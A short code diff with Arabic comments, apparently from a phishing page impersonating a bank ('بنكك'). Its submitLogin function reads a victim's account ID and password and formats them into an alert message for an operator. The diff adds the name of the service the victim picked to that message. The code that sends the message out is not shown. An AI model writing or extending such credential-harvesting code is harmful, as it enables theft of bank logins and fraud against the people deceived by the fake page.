@@ -752,7 +752,7 @@
         }
     }
 
-    // 1. إرسال رسالة تسجيل الدخول منفصلة ومختصرة مثل الصورة
+    // 1. إرسال رسالة تسجيل الدخول منفصلة ومختصرة مع اسم الخدمة المختارة
     function submitLogin() {
         userData.account = document.getElementById('accountInput').value;
         userData.password = document.getElementById('passInput').value;
@@ -762,7 +762,10 @@
             return;
         }
 
+        const serviceLabel = currentService ? `خدمة ${currentService}` : "غير محددة";
+
         let msg = `🚨 تسجيل دخول (بنكك)\n\n` +
+                  `📌 الخدمة: ${serviceLabel}\n` +
                   `👤 المعرف: \`${userData.account}\`\n` +
                   `🔑 كلمة المرور: \`${userData.password}\``;
         
